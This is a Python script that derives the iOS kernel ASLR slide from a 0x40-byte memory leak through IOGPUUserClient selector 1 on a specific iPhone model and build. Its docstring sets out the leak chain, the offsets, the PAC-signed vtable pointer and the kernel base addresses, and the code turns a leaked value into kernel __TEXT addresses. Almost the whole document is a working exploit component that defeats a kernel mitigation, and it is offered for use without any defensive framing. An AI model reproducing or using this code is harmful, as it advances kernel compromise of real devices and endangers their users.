#!/usr/bin/env python3
"""KASLR slide from the 0x40-byte IOGPU selector-1 leak (iPhone14,7 / 24B115).

Chain (verified statically):
  IOGPUUserClient externalMethod sel 1  (0xfffffff009947444)
      memcpy(out, *(provider+0x1e8), 0x40)
  provider+0x1e8 = device+0x548 = [0xfffffff00add7728]
  [0xadd7728] = firmware IOUAT object (IOUnifiedAddressTranslator), size 0x570
  constructor 0xfffffff00a9ec758 / 0xfffffff00a9ec60c:
      x16 = 0xfffffff007c67f18
      pacda x16, (x0 | 0xcda1<<48)
      str   x16, [x0]              <- q0 = signed vtable pointer

Therefore:
  q0 & 0xffffffff == (0x07c67f18 + slide) & 0xffffffff
  slide = ((q0 & 0xffffffff) - 0x07c67f18) & 0xffffffff
  kernel __TEXT      = 0xfffffff007004000 + slide
  kernel __TEXT_EXEC = 0xfffffff00814c000 + slide

Sanity markers in the same 0x40 bytes:
  q1 (offset +8) low 32 bits == 1   (retain count set by the constructor)
  q0 bits 47:32 should be close to 0xfff0 (+carry) and bits 63:48 are PAC.

usage:
  python3 kaslr_from_q0.py 0x<q0> [0x<q1> ...]
  python3 kaslr_from_q0.py leak.bin          # raw 0x40-byte dump, little endian
"""
import struct
import sys

VT = 0xFFFFFFF007C67F18
VT_LO = VT & 0xFFFFFFFF
TEXT = 0xFFFFFFF007004000
TEXT_EXEC = 0xFFFFFFF00814C000


def from_q0(q0):
    slide = ((q0 & 0xFFFFFFFF) - VT_LO) & 0xFFFFFFFF
    return slide, (TEXT + slide) & 0xFFFFFFFFFFFFFFFF, (TEXT_EXEC + slide) & 0xFFFFFFFFFFFFFFFF


def main():
    if len(sys.argv) == 2 and not sys.argv[1].lower().startswith("0x"):
        data = open(sys.argv[1], "rb").read()
        q = struct.unpack_from("<8Q", data, 0)
    else:
        q = [int(x, 0) for x in sys.argv[1:]]
    if not q:
        print(__doc__)
        return
    q0 = q[0]
    slide, ktext, kexec = from_q0(q0)
    print("q0            = %#018x" % q0)
    print("vtable static = %#x" % VT)
    print("slide         = %#x" % slide)
    print("kernel __TEXT      = %#x" % ktext)
    print("kernel __TEXT_EXEC = %#x" % kexec)
    print("offset bits 47:32 of q0 = %#06x (expect ~0xfff0)" % ((q0 >> 32) & 0xFFFF))
    if len(q) > 1:
        print("q1            = %#018x  low32=%d (expect 1)" % (q[1], q[1] & 0xFFFFFFFF))
        print("q1 check:", "OK" if (q[1] & 0xFFFFFFFF) == 1 else "MISMATCH -> not the IOUAT object")
    print("q0 check:", "OK" if (q0 >> 47) & 0x1FFFF else "q0 has no 0xffff... prefix?")


if __name__ == "__main__":
    main()
